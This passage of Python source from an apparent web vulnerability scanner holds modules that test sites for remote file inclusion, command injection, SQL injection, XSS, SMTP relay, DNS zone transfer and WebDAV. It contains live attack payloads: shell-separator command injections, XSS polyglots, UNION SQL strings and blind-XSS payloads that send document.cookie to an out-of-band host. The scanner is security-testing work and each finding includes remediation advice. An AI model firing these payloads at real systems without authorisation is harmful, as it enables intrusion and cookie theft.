            "resource","doc","view","theme","lang","include_file","require"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    try: bl = session.get(target, timeout=TIMEOUT)
    except: return findings

    for p in params:
        for oob_url, indicator in OOB_URLS[:4]:
            try:
                resp = session.get(inject_param(target, p, oob_url), timeout=TIMEOUT)
                if not resp: continue
                if indicator and indicator in resp.text and (not bl or indicator not in bl.text):
                    score, vector, _ = CVSS31.for_module("rfi")
                    logger.log("RFI", f"RFI confirmed in '{p}' via {oob_url[:40]}", "CRITICAL")
                    findings.append(make_finding("lfi",
                        f"Remote File Inclusion in '{p}'", "Critical",
                        f"Parameter '{p}' loaded remote URL '{oob_url}'. Indicator '{indicator}' confirmed. "
                        f"Full RCE possible via PHP wrappers.",
                        "Never pass user-controlled values to include/require functions. "
                        "Disable allow_url_include in php.ini. Whitelist allowed file paths.",
                        url=inject_param(target, p, oob_url),
                        payload=oob_url, cwe="CWE-98",
                        evidence=f"cvss={score} {vector}",
                        confidence="High"))
                    return findings
            except Exception:
                pass
    return findings


# ── BLIND COMMAND INJECTION (time-based) ──────────────────────────────────────
def module_blind_cmd_injection(target, session):
    """
    A03/T1059: Blind OS command injection via time delay — zero-FP:
    1. Baseline response time measured 3 times (median)
    2. Injection must delay exactly the expected amount
    3. Two independent confirmations required
    4. Both Linux and Windows payloads tested
    """
    findings = []
    logger.log("CMD-BLIND", "Blind command injection (time-based) …")

    DELAY_SEC = 5
    PAYLOADS = [
        # Linux
        (f"; sleep {DELAY_SEC} #",       "Linux semicolon"),
        (f"| sleep {DELAY_SEC}",          "Linux pipe"),
        (f"`sleep {DELAY_SEC}`",          "Linux backtick"),
        (f"$(sleep {DELAY_SEC})",         "Linux $()"),
        (f"\n sleep {DELAY_SEC} \n",      "Linux newline"),
        # Windows
        (f"& timeout /t {DELAY_SEC} &",  "Windows timeout"),
        (f"| timeout /t {DELAY_SEC}",    "Windows pipe"),
        (f"; timeout /t {DELAY_SEC}",    "Windows semicolon"),
        (f"& ping -n {DELAY_SEC+1} 127.0.0.1", "Windows ping"),
    ]
    FUZZ = ["cmd","command","exec","run","ping","host","ip","target","query",
            "search","input","dir","path","file","action","do","process"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    import statistics
    try:
        bl_times = []
        for _ in range(3):
            t0 = time.time()
            session.get(target, timeout=TIMEOUT)
            bl_times.append(time.time() - t0)
        bl_med = statistics.median(bl_times)
        if bl_med >= 3: return findings
    except: return findings

    for p in params:
        for pl, desc in PAYLOADS:
            confirmed = 0
            for _ in range(2):  # Need 2 confirmations
                try:
                    t0 = time.time()
                    session.get(inject_param(target, p, pl), timeout=DELAY_SEC + 10)
                    atk_t = time.time() - t0
                    if atk_t >= DELAY_SEC * 0.85 and atk_t > bl_med + DELAY_SEC * 0.7:
                        confirmed += 1
                except: pass
            if confirmed >= 2:
                score, vector, _ = CVSS31.for_module("cmd_injection")
                logger.log("CMD-BLIND", f"Blind cmd injection in '{p}' ({desc})", "CRITICAL")
                findings.append(make_finding("ssti",
                    f"Blind OS Command Injection in '{p}'", "Critical",
                    f"Parameter '{p}' delayed {DELAY_SEC}s on 2/2 attempts using: {pl} ({desc}). "
                    f"Baseline: {bl_med:.1f}s. Full RCE possible.",
                    "Never pass user input to shell commands. Use subprocess with argument arrays. "
                    "Implement allowlisting for any OS-level operations.",
                    url=inject_param(target, p, pl),
                    payload=pl, cwe="CWE-78",
                    evidence=f"cvss={score} {vector}, confirmed=2/2",
                    confidence="High"))
                return findings
    return findings


# ── SMTP OPEN RELAY TEST ───────────────────────────────────────────────────────
def module_smtp_relay(target, session):
    """
    A05: SMTP open relay test — actually connect to SMTP and test relay.
    An open relay allows anyone to send email through your server.
    """
    findings = []
    logger.log("SMTP-RELAY", "SMTP open relay test …")
    domain = get_domain(target)

    import socket as _sock, smtplib

    SMTP_PORTS = [25, 587, 465]
    for port in SMTP_PORTS:
        try:
            # Test if port is open first
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(5)
            result = s.connect_ex((domain, port))
            s.close()
            if result != 0: continue

            logger.log("SMTP-RELAY", f"Testing SMTP relay on port {port}", "INFO")

            # Attempt SMTP relay (send from external → external via this server)
            try:
                if port == 465:
                    smtp = smtplib.SMTP_SSL(domain, port, timeout=10)
                else:
                    smtp = smtplib.SMTP(domain, port, timeout=10)
                    try: smtp.starttls()
                    except: pass

                smtp.ehlo("darkdevil-relay-test.com")
                # Try to send from external address to external address (relay test)
                try:
                    smtp.mail("test@external-relay-test.com")
                    code, msg = smtp.rcpt("test@another-external.com")
                    if code == 250:
                        score, vector, _ = CVSS31.for_module("smtp_relay")
                        logger.log("SMTP-RELAY", f"OPEN RELAY confirmed on port {port}!", "CRITICAL")
                        findings.append(make_finding("spf_dmarc",
                            f"SMTP Open Relay on Port {port}", "High",
                            f"SMTP server on port {port} accepted relay from external→external. "
                            f"RCPT TO returned 250 for non-local address. "
                            f"Can be abused to send spam/phishing from your domain.",
                            "Restrict SMTP relay to authenticated users only. "
                            "Configure 'mynetworks' in Postfix or equivalent. "
                            "Enable SMTP AUTH and disable unauthenticated relay.",
                            url=f"smtp://{domain}:{port}",
                            cwe="CWE-16", evidence=f"cvss={score} {vector}",
                            confidence="High"))
                    smtp.quit()
                except smtplib.SMTPRecipientsRefused:
                    # Good — relay refused (not an open relay)
                    smtp.quit()
                except Exception:
                    try: smtp.quit()
                    except: pass
            except Exception:
                pass
        except Exception:
            pass
    return findings


# ── DNS ZONE TRANSFER (internal, no dnsrecon required) ────────────────────────
def module_dns_zone_transfer(target, session):
    """
    A05/T1595: Internal DNS zone transfer (AXFR) test.
    A successful zone transfer leaks ALL DNS records for the domain.
    """
    findings = []
    logger.log("ZONE-XFR", "DNS zone transfer (AXFR) test …")
    domain = get_domain(target)

    import socket as _sock

    try:
        # Get authoritative nameservers first
        ns_servers = []
        try:
            import subprocess as _sp
            ns_out = _sp.run(["dig", "+short", "NS", domain],
                            capture_output=True, text=True, timeout=10)
            if ns_out.returncode == 0:
                ns_servers = [l.strip().rstrip('.') for l in ns_out.stdout.splitlines() if l.strip()]
        except Exception:
            pass

        # Also try resolving the domain's nameservers manually
        if not ns_servers:
            ns_servers = [domain]

        for ns in ns_servers[:3]:
            try:
                # Connect to port 53 TCP (AXFR requires TCP)
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(8)
                ns_ip = _sock.gethostbyname(ns)
                s.connect((ns_ip, 53))

                # Build AXFR query (DNS wire format)
                # Query: domain AXFR IN
                def build_axfr(domain_name):
                    labels = domain_name.encode().split(b'.')
                    qname = b''
                    for label in labels:
                        qname += bytes([len(label)]) + label
                    qname += b'\x00'
                    # Header: ID=0x1234, QR=0, Opcode=0, AA=0, TC=0, RD=1
                    # QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
                    header = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                    question = qname + b'\x00\xfc\x00\x01'  # QTYPE=AXFR(252), QCLASS=IN(1)
                    msg = header + question
                    # TCP DNS: prepend 2-byte length
                    return bytes([len(msg) >> 8, len(msg) & 0xff]) + msg

                query = build_axfr(domain)
                s.send(query)
                response = s.recv(4096)
                s.close()

                # Check if we got a real zone transfer response (not just REFUSED)
                if len(response) > 20:
                    # Check RCODE in header (byte 3, lower 4 bits)
                    rcode = response[3] & 0x0F if len(response) > 5 else 0xFF
                    ancount = (response[6] << 8 | response[7]) if len(response) > 7 else 0

                    if rcode == 0 and ancount > 0:
                        score, vector, _ = CVSS31.for_module("recon")
                        logger.log("ZONE-XFR", f"ZONE TRANSFER POSSIBLE from {ns}!", "CRITICAL")
                        findings.append(make_finding("spf_dmarc",
                            f"DNS Zone Transfer (AXFR) Possible from {ns}", "Critical",
                            f"Nameserver {ns} allowed AXFR zone transfer for {domain}. "
                            f"Response: {ancount} records returned. "
                            f"Attacker can enumerate ALL DNS records: subdomains, internal hosts, mail servers.",
                            "Restrict AXFR to authorised secondary nameservers only. "
                            "Use TSIG (Transaction Signatures) for zone transfers. "
                            "Configure 'allow-transfer' in BIND or equivalent.",
                            url=f"dns://{ns}/AXFR/{domain}",
                            cwe="CWE-200",
                            evidence=f"axfr_records={ancount}, cvss={score}",
                            confidence="High"))
                        return findings
            except Exception:
                pass
    except Exception:
        pass
    return findings


# ── DOM-BASED XSS + STORED XSS ────────────────────────────────────────────────
def module_xss_advanced(target, session):
    """
    A03: Advanced XSS — DOM-based, polyglot, mXSS, stored XSS detection.
    Complements module_xss which only does reflected.
    """
    findings = []
    logger.log("XSS-ADV", "Advanced XSS (DOM/polyglot/stored) …")

    resp = safe_get(session, target)
    if not resp: return findings
    body = resp.text

    # ── DOM-based XSS source detection ────────────────────────────────────────
    DOM_SOURCES = [
        r"document\.URL", r"document\.location", r"window\.location",
        r"document\.referrer", r"location\.hash", r"location\.search",
        r"location\.href", r"document\.cookie",
    ]
    DOM_SINKS = [
        r"document\.write\s*\(", r"document\.writeln\s*\(",
        r"innerHTML\s*=", r"outerHTML\s*=",
        r"eval\s*\(", r"setTimeout\s*\([\"']",
        r"setInterval\s*\([\"']", r"execScript\s*\(",
        r"location\s*=", r"location\.href\s*=",
        r"\.src\s*=", r"document\.domain\s*=",
    ]
    js_urls = [urljoin(target, m) for m in
               re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body)][:15]

    dom_sources_found = []
    dom_sinks_found   = []

    for js_url in js_urls:
        try:
            js_resp = session.get(js_url, timeout=TIMEOUT)
            if not js_resp or js_resp.status_code != 200: continue
            js_body = js_resp.text
            for src in DOM_SOURCES:
                if re.search(src, js_body):
                    dom_sources_found.append(src.replace(r"\s*", " ").replace(r"\.", "."))
            for sink in DOM_SINKS:
                if re.search(sink, js_body):
                    dom_sinks_found.append(sink.replace(r"\s*", " ").replace(r"\.", "."))
        except Exception:
            pass

    # Also check inline scripts
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S|re.I)
    for script in inline_scripts:
        for src in DOM_SOURCES:
            if re.search(src, script): dom_sources_found.append(src.replace(r"\.", "."))
        for sink in DOM_SINKS:
            if re.search(sink, script): dom_sinks_found.append(sink.replace(r"\.", "."))

    if dom_sources_found and dom_sinks_found:
        score, vector, _ = CVSS31.for_module("xss")
        logger.log("XSS-ADV", f"DOM XSS: sources={dom_sources_found[:2]}, sinks={dom_sinks_found[:2]}", "WARNING")
        findings.append(make_finding("xss",
            "DOM-Based XSS Attack Surface Detected", "Medium",
            f"JavaScript code reads from DOM sources ({', '.join(set(dom_sources_found[:3]))}) "
            f"and writes to DOM sinks ({', '.join(set(dom_sinks_found[:3]))}). "
            f"Manual review required to confirm exploitability.",
            "Avoid using DOM sources as input to DOM sinks. "
            "Use textContent instead of innerHTML. "
            "Implement DOMPurify for HTML sanitisation.",
            url=target, cwe="CWE-79",
            evidence=f"sources={dom_sources_found[:3]}, sinks={dom_sinks_found[:3]}, cvss={score}",
            confidence="Medium"))

    # ── Polyglot XSS payloads ─────────────────────────────────────────────────
    CANARY = f"ddPoly{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    POLYGLOTS = [
        f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={CANARY}() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={CANARY}()//>>",
        f"'\">{CANARY}<img src=x onerror={CANARY}><",
        f"</script><script>{CANARY}</script>",
        f"<scr\x00ipt>{CANARY}</scr\x00ipt>",  # mXSS null byte
    ]
    try:
        bl = session.get(target, timeout=TIMEOUT)
        for p in extract_params(target)[:MAX_PARAMS]:
            for pl in POLYGLOTS[:2]:
                try:
                    r = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                    if (r and CANARY in r.text and
                        "text/html" in r.headers.get("Content-Type","") and
                        (not bl or CANARY not in bl.text)):
                        score, vector, _ = CVSS31.for_module("xss")
                        logger.log("XSS-ADV", f"Polyglot XSS in '{p}'", "CRITICAL")
                        findings.append(make_finding("xss",
                            f"Polyglot XSS in '{p}'", "High",
                            f"Polyglot XSS payload reflected in '{p}'. Multiple XSS contexts bypassed.",
                            "Use context-aware output encoding. Implement strict CSP.",
                            url=inject_param(target, p, pl), payload=pl[:80],
                            cwe="CWE-79",
                            evidence=f"cvss={score} {vector}",
                            confidence="High"))
                        break
                except Exception: pass
    except Exception: pass

    return findings


# ── SECOND-ORDER SQL INJECTION ─────────────────────────────────────────────────
def module_sqli_advanced(target, session):
    """
    A03: Second-order SQL injection — payload stored then executed later.
    Also: UNION-based extraction probe.
    """
    findings = []
    logger.log("SQLI-ADV", "2nd-order SQLi + UNION probe …")

    # UNION-based SQLi detection
    UNION_PAYLOADS = [
        ("' UNION SELECT NULL--",              1),
        ("' UNION SELECT NULL,NULL--",         2),
        ("' UNION SELECT NULL,NULL,NULL--",    3),
        ("' UNION SELECT 1,2,3--",             3),
        ("1 UNION ALL SELECT NULL,NULL,NULL--",3),
    ]
    ERROR_PATTERNS = [
        r"ORA-\d{5}", r"SQL syntax.*MySQL", r"PostgreSQL.*ERROR",
        r"SqlException", r"sqlite3\.OperationalError",
        r"column count doesn't match", r"The used SELECT statements",
        r"union.*select.*from", r"UNION.*SELECT",
    ]
    FUZZ = ["id","user","search","q","name","cat","item","page","ref","uid","pid","order"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    try:
        bl = session.get(target, timeout=TIMEOUT)
        bl_text = bl.text if bl else ""
    except: return findings

    for p in params:
        for pl, col_count in UNION_PAYLOADS:
            try:
                r = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not r: continue
                # Check for UNION success indicators
                for pat in ERROR_PATTERNS:
                    m = re.search(pat, r.text, re.I)
                    if m and m.group(0) not in bl_text:
                        score, vector, _ = CVSS31.for_module("sqli")
                        logger.log("SQLI-ADV", f"UNION SQLi in '{p}'", "CRITICAL")
                        findings.append(make_finding("sqli",
                            f"UNION-Based SQL Injection in '{p}'", "Critical",
                            f"UNION payload triggered: {m.group(0)[:80]}. "
                            f"Data extraction may be possible ({col_count} columns).",
                            "Use parameterised queries. Disable verbose DB errors.",
                            url=inject_param(target, p, pl), payload=pl,
                            cwe="CWE-89", evidence=f"cvss={score} {vector}",
                            confidence="High"))
                        return findings
            except Exception: pass

    # 2nd-order: register with SQLi payload, then check if it gets executed
    REGISTRATION_PATHS = ["/register", "/signup", "/api/register",
                          "/api/v1/register", "/profile/update"]
    for reg_path in REGISTRATION_PATHS:
        reg_url = target.rstrip("/") + reg_path
        try:
            probe = session.get(reg_url, timeout=TIMEOUT)
            if not probe or probe.status_code not in (200, 201): continue
            # Register with SQLi in username field
            payload_user = f"' OR '1'='1"
            r = session.post(reg_url, json={
                "username": payload_user, "email": "dd@test-sqli.com",
                "password": "TestPass123!"
            }, timeout=TIMEOUT)
            if r and r.status_code in (200, 201):
                # Now check if the stored value causes errors on retrieval
                profile_paths = ["/profile", "/api/profile", "/api/v1/user", "/account"]
                for pp in profile_paths:
                    r2 = session.get(target.rstrip("/") + pp, timeout=TIMEOUT)
                    if r2:
                        for pat in ERROR_PATTERNS[:3]:
                            if re.search(pat, r2.text, re.I):
                                findings.append(make_finding("sqli",
                                    "Second-Order SQL Injection (Registration)", "Critical",
                                    f"SQLi payload stored via {reg_path} and triggered on {pp}.",
                                    "Sanitise all stored data before use in SQL queries.",
                                    url=reg_url, payload=payload_user,
                                    cwe="CWE-89", confidence="Medium"))
                                return findings
        except Exception: pass
    return findings


# ── WEBDAV DETECTION ───────────────────────────────────────────────────────────
def module_webdav(target, session):
    """A05: WebDAV misconfiguration — allows file upload/modification."""
    findings = []
    logger.log("WEBDAV", "WebDAV detection …")
    try:
        # PROPFIND is the WebDAV discovery method
        r = session.request("PROPFIND", target, timeout=TIMEOUT,
                           headers={"Depth": "0", "Content-Type": "text/xml"})
        if r and r.status_code in (200, 207):  # 207 Multi-Status = WebDAV
            webdav_methods = ["PROPFIND","PROPPATCH","MKCOL","COPY","MOVE","LOCK","UNLOCK","PUT"]
            options = session.options(target, timeout=TIMEOUT)
            allow = options.headers.get("Allow","").upper() if options else ""
            dangerous = [m for m in webdav_methods if m in allow]

            if dangerous or r.status_code == 207:
                score, vector, _ = CVSS31.for_module("webdav")
                logger.log("WEBDAV", f"WebDAV enabled! Methods: {dangerous}", "CRITICAL")
                findings.append(make_finding("http_methods",
                    "WebDAV Enabled — File Upload Risk", "High",
                    f"WebDAV is enabled. Status: {r.status_code}. "
                    f"Dangerous methods allowed: {', '.join(dangerous) or 'detected via PROPFIND'}. "
                    "Allows remote file creation, modification, and deletion.",
                    "Disable WebDAV unless explicitly required. "
                    "If needed, restrict to authenticated users and specific directories.",
                    url=target, cwe="CWE-650",
                    evidence=f"cvss={score} {vector}, methods={dangerous}",
                    confidence="High"))

        # Try MKCOL to create a directory (non-destructive probe)
        test_dir = target.rstrip("/") + f"/dd_webdav_probe_{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}/"
        r2 = session.request("MKCOL", test_dir, timeout=TIMEOUT)
        if r2 and r2.status_code in (201, 200):
            logger.log("WEBDAV", "MKCOL succeeded — can create directories!", "CRITICAL")
            # Delete what we created
            try: session.request("DELETE", test_dir, timeout=5)
            except: pass
            findings.append(make_finding("http_methods",
                "WebDAV MKCOL — Directory Creation Allowed", "Critical",
                "MKCOL request successfully created a directory on the server. "
                "Full file system write access may be possible.",
                "Disable WebDAV write access immediately.",
                url=target, cwe="CWE-434", confidence="High"))
    except Exception:
        pass
    return findings


# ── HTTP VERB TAMPERING (per endpoint) ────────────────────────────────────────
def module_verb_tampering(target, session):
    """A05: HTTP verb tampering — bypass auth/controls by switching HTTP method."""
    findings = []
    logger.log("VERB-TAMP", "HTTP verb tampering …")
    DANGEROUS = ["PUT","DELETE","PATCH","HEAD","OPTIONS","TRACE","CONNECT","DEBUG"]
    # Test auth-protected paths
    PROTECTED_PATHS = ["/admin", "/api/admin", "/api/delete",
                       "/api/v1/user", "/dashboard", "/manage"]

    for path in PROTECTED_PATHS:
        url = target.rstrip("/") + path
        try:
            # First check with GET — if 401/403, it's protected
            get_r = session.get(url, timeout=TIMEOUT)
            if not get_r or get_r.status_code not in (401, 403): continue

            for method in ["HEAD","OPTIONS","PUT","DELETE","PATCH"]:
                try:
                    r = session.request(method, url, timeout=TIMEOUT)
                    if r and r.status_code not in (401, 403, 405, 501):
                        score, vector, _ = CVSS31.for_module("403_bypass")
                        logger.log("VERB-TAMP",
                            f"Verb tampering bypass: {method} on {path}", "WARNING")
                        findings.append(make_finding("403_bypass",
                            f"HTTP Verb Tampering Bypass: {method} on {path}", "High",
                            f"GET to {path} returned {get_r.status_code} (protected). "
                            f"But {method} returned {r.status_code} (bypassed).",
                            "Enforce authentication on ALL HTTP methods, not just GET/POST. "
                            "Use method-agnostic access control.",
                            url=url, payload=f"Method: {method}",
                            cwe="CWE-288", evidence=f"cvss={score} {vector}",
                            confidence="Medium"))
                except Exception: pass
        except Exception: pass
    return findings


# ── BLIND XSS via Interactsh ──────────────────────────────────────────────────
def module_blind_xss(target, session):
    """A03: Blind XSS — inject callback payloads into all parameters and headers."""
    findings = []
    if not find_bin("interactsh-client"): return findings
    logger.log("BLIND-XSS", "Blind XSS injection probes …")

    import queue as _q, threading as _th

    oob_domain = None
    output_q   = _q.Queue()
    oob_file   = "/tmp/dd_bxss_hits.txt"

    def _reader(proc, q):
        try:
            for raw in proc.stdout:
                raw = raw.strip()
                if raw: q.put(raw); return
        except Exception as e: q.put(f"ERR:{e}")

    proc = None
    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json", "-o", oob_file, "-v"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1,
            env={**os.environ, "PATH": _EXT_PATH})

        reader = _th.Thread(target=_reader, args=(proc, output_q), daemon=True)
        reader.start()
        reader.join(timeout=8)

        if not output_q.empty():
            line = output_q.get_nowait()
            if not line.startswith("ERR:"):
                try:
                    oob_data = json.loads(line)
                    oob_domain = oob_data.get("domain","")
                except Exception:
                    m = re.search('["]domain["]:[ ]*["]([^"]+)["]', line)
                    if m: oob_domain = m.group(1)

        if not oob_domain:
            try: proc.terminate()
            except: pass
            return findings

        logger.log("BLIND-XSS", f"OOB domain: {oob_domain}", "SUCCESS")

        # Blind XSS payloads — all fire HTTP callbacks
        BXSS_PAYLOADS = [
            f'"><script src="http://{oob_domain}"></script>',
            f"'><script src='http://{oob_domain}'></script>",
            f'<img src="x" onerror="var x=new Image();x.src=\'http://{oob_domain}/\'+document.cookie">',
            f'javascript:fetch("http://{oob_domain}/bxss?c="+document.cookie)',
            f'<svg onload="fetch(\'http://{oob_domain}/x\')">',
        ]

        FUZZ = ["q","search","name","email","subject","message","comment",
                "body","content","text","msg","note","ref","title","description",
                "feedback","review","username","first_name","last_name",
                "address","company","url","website","callback"]

        params = list(dict.fromkeys(extract_params(target) + FUZZ))[:10]

        # Inject into URL params
        for p in params:
            for pl in BXSS_PAYLOADS[:3]:
                try:
                    session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                except Exception: pass

        # Inject into headers (Referer, User-Agent, X-Forwarded-For)
        for pl in BXSS_PAYLOADS[:2]:
            for hdr in ["Referer", "User-Agent", "X-Forwarded-For",
                        "X-Real-IP", "Origin"]:
                try:
                    session.get(target, headers={hdr: pl}, timeout=TIMEOUT)
                except Exception: pass

        # Wait for OOB callbacks
        time.sleep(10)
        try: proc.terminate()
        except: pass

        # Check for hits
        if os.path.exists(oob_file):
            try:
                hits = open(oob_file, errors="ignore").read()
                if oob_domain in hits or '"dns"' in hits or '"http"' in hits:
                    score, vector, _ = CVSS31.for_module("blind_xss")
                    logger.log("BLIND-XSS", "Blind XSS callback confirmed!", "CRITICAL")
                    findings.append(make_finding("xss",
                        "Blind XSS Confirmed via OOB Callback", "High",
                        f"Blind XSS payload triggered a callback to {oob_domain}. "
                        "Indicates user input is rendered in an admin/backend context without sanitisation.",
                        "HTML-encode all user-controlled content before rendering. "
                        "Implement CSP. Audit admin/backend panel for stored XSS.",
                        url=target, evidence=f"oob={oob_domain}, cvss={score}",
                        cwe="CWE-79", confidence="High"))
                os.remove(oob_file)
            except Exception: pass
    except Exception as e:
        logger.log("BLIND-XSS", f"Error: {e}", "ERROR")
        try:
            if proc: proc.terminate()
        except: pass

    return findings


# ── MULTI-TARGET ORCHESTRATOR ─────────────────────────────────────────────────
def run_multi_target(targets: list, proxy=None, output_dir="obs_reports",
                     html=False, skip_crawl=False, auto_install=True,
                     threads=THREADS, min_severity=None, cookies=None,
                     headers_extra=None, verbose=False):
    """Run scanner against multiple targets sequentially with per-target reports."""
    Path(output_dir).mkdir(exist_ok=True)
    results = []
    total   = len(targets)

    print()
    pulse_line(f"☠  MULTI-TARGET MODE — {total} TARGETS  ☠", C.PUR)
    print(f"  {C.WHT}Output dir : {C.GRN}{output_dir}{C.RST}")
    print(f"  {C.WHT}Targets    : {C.GRN}{total}{C.RST}")
    print()

    for idx, target in enumerate(targets, 1):
        target = target.strip()
        if not target or target.startswith("#"): continue
        if not target.startswith(("http://","https://")):
            target = "https://" + target

        print()
        pulse_line(f"☠  [{idx}/{total}]  {target}  ☠", C.CYN)
        safe_name = re.sub(r'[^\w\-]', '_', target.replace('https://','').replace('http://',''))[:40]
        out_path  = str(Path(output_dir) / f"dd_{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")

        try:
            out_files = run_scan(
                target=target, proxy=proxy, output=out_path,
                html=html, skip_crawl=skip_crawl, auto_install=False,
                threads=threads, min_severity=min_severity,
                cookies=cookies, headers_extra=headers_extra, verbose=verbose)
            results.append({"target": target, "output": out_files, "status": "OK"})
        except Exception as e:
            logger.log("MULTI", f"Target {target} failed: {e}", "ERROR")
            results.append({"target": target, "output": [], "status": f"ERROR: {e}"})

    # Summary
    print()
    pulse_line(f"☠  MULTI-TARGET SCAN COMPLETE  ☠", C.GRN)
    print(f"\n  {C.WHT}Targets scanned  : {C.GRN}{len(results)}{C.RST}")
    print(f"  {C.WHT}Reports in       : {C.GRN}{output_dir}/{C.RST}")
    for r in results:
        st = C.GRN + "✔" if r["status"] == "OK" else C.RED + "✗"
        print(f"  {st}{C.RST}  {r['target'][:55]}")
    print()
    return results


# ── VERBOSE HTTP LOGGER ────────────────────────────────────────────────────────
class VerboseLogger:
    """Capture and display raw HTTP requests/responses when --verbose is active."""
    def __init__(self, active=False):
        self.active = active
        self._lock  = __import__('threading').Lock()

    def log_request(self, method, url, headers=None, body=None):
        if not self.active: return
        with self._lock:
            print(f"\n  {C.DIM}{'─'*60}{C.RST}")
            print(f"  {C.CYN}→ {method} {url}{C.RST}")
            if headers:
                for k, v in (headers.items() if isinstance(headers, dict) else headers):
                    print(f"  {C.DIM}  {k}: {v}{C.RST}")
            if body:
                print(f"  {C.DIM}  {str(body)[:200]}{C.RST}")

    def log_response(self, status, headers=None, body_preview=None):
        if not self.active: return
        with self._lock:
            col = C.RED if status >= 400 else C.GRN if status < 300 else C.YLW
            print(f"  {col}← {status}{C.RST}")
            if headers:
                for k, v in (headers.items() if isinstance(headers, dict) else []):
                    print(f"  {C.DIM}  {k}: {v}{C.RST}")
            if body_preview:
                print(f"  {C.DIM}  {str(body_preview)[:150]}…{C.RST}")

_verbose_logger = VerboseLogger(False)


# ── SCAN CHECKPOINT / RESUME ───────────────────────────────────────────────────
class ScanCheckpoint:
    """Save/restore scan progress to disk for resume capability."""
    def __init__(self, target: str, work_dir: Path):
        safe = re.sub(r'[^\w]', '_', target)[:40]
        self.path     = work_dir / f"checkpoint_{safe}.json"
        self.target   = target
        self.completed: set = set()
        self.findings:  list = []
        self._load()

    def _load(self):
        if self.path.exists():
            try:
                data = json.loads(self.path.read_text())
                self.completed = set(data.get("completed", []))
                self.findings  = data.get("findings", [])
                if self.completed:
                    logger.log("RESUME",
                        f"Resuming scan — {len(self.completed)} phases already done",
                        "SUCCESS")
            except Exception:
                pass

    def save(self, phase: str, new_findings: list):
        self.completed.add(phase)
        self.findings.extend([f.to_dict() if hasattr(f,'to_dict') else f
                              for f in new_findings])
        try:
            self.path.write_text(json.dumps({
                "target":    self.target,
                "completed": list(self.completed),
                "findings":  self.findings,
                "saved_at":  datetime.now().isoformat(),
            }, indent=2))
        except Exception:
            pass

    def done(self, phase: str) -> bool:
        return phase in self.completed

    def clear(self):
        if self.path.exists():
            self.path.unlink(missing_ok=True)




# ═══════════════════════════════════════════════════════════════════════════════
# AI-ASSISTED PENTESTING ENGINE — v6.1
# Based on: "Generative AI-Supported Pentesting" (arXiv:2501.06963)
# Implements PTES 7-phase methodology with Claude API + nmap deep + MSF check
# Detection & Analysis ONLY — no exploitation, no payload generation
# ═══════════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────────────────
# PTES PHASE TRACKER
# ─────────────────────────────────────────────────────────────────────────────
PTES_PHASES = {
    1: ("Pre-Engagement",          "Scope, rules of engagement, objectives"),
    2: ("Intelligence Gathering",  "Passive/active recon, OSINT, fingerprinting"),
    3: ("Threat Modeling",         "Attack surface mapping, risk prioritization"),
    4: ("Vulnerability Analysis",  "Identification, CVSS scoring, FP elimination"),
    5: ("Post-Exploitation",       "Impact assessment — detection only, no exploit"),
    6: ("Lateral Movement Intel",  "Internal exposure mapping, trust paths"),
    7: ("Reporting",               "CVSS-scored report, PTES-formatted, SARIF/MD"),
}


# ─────────────────────────────────────────────────────────────────────────────
# NMAP DEEP INTEGRATION (full NSE vulnerability detection)
# ─────────────────────────────────────────────────────────────────────────────
def tool_nmap_deep(target, workdir, ports=None):
    """
    Deep nmap scan with NSE vulnerability scripts.
    Detects service versions, runs vuln scripts, cross-references CVEs.
    Detection only — no exploitation.
    """
    findings = []
    if not cmd_exists("nmap"):
        logger.log("NMAP", "nmap not found — install: apt install nmap", "WARNING")
        return findings

    domain  = get_domain(target)
    port_arg = ",".join(str(p) for p in ports) if ports else "1-65535"
    out_xml  = workdir / "nmap_deep.xml"
    out_txt  = workdir / "nmap_deep.txt"

    logger.log("NMAP", f"Deep nmap + NSE: {domain}", "TOOL")

    # Phase 1: Fast SYN scan to find open ports
    run_cmd(["nmap", "-sS", "--open", "-p", port_arg,
             "--min-rate", "1000", "-T4", "-oG", str(workdir/"nmap_fast.gnmap"),
             domain], timeout=300)

    # Phase 2: Service version detection + NSE vuln scripts on open ports
    run_cmd([
        "nmap",
        "-sV",                   # service version detection
        "-sC",                   # default scripts
        "--script",              # NSE vulnerability scripts
        "vuln,auth,default,discovery,safe",
        "-p", port_arg,
        "-oX", str(out_xml),     # XML for parsing
        "-oN", str(out_txt),     # human readable
        "--version-intensity", "7",
        "--script-timeout", "30s",
        "-T4",
        domain,
    ], timeout=600)

    if not out_xml.exists():
        logger.log("NMAP", "No output — scan may have timed out", "WARNING")
        return findings

    # Parse XML output
    try:
        import xml.etree.ElementTree as ET
        tree   = ET.parse(str(out_xml))
        root   = tree.getroot()

        for host in root.findall("host"):
            for port_el in host.findall(".//port"):
                port_id  = int(port_el.get("portid", 0))
                proto    = port_el.get("protocol", "tcp")
                state    = port_el.find("state")
                if state is None or state.get("state") != "open": continue

                svc      = port_el.find("service")
                svc_name = svc.get("name","?") if svc is not None else "?"
                svc_prod = svc.get("product","") if svc is not None else ""
                svc_ver  = svc.get("version","")  if svc is not None else ""
                svc_cpe  = svc.get("extrainfo","") if svc is not None else ""
                full_svc = f"{svc_prod} {svc_ver}".strip()

                # Cross-reference CVE database
                cves = PORT_CVE_DB.get(port_id, [])
                cve_str = ""
                if cves:
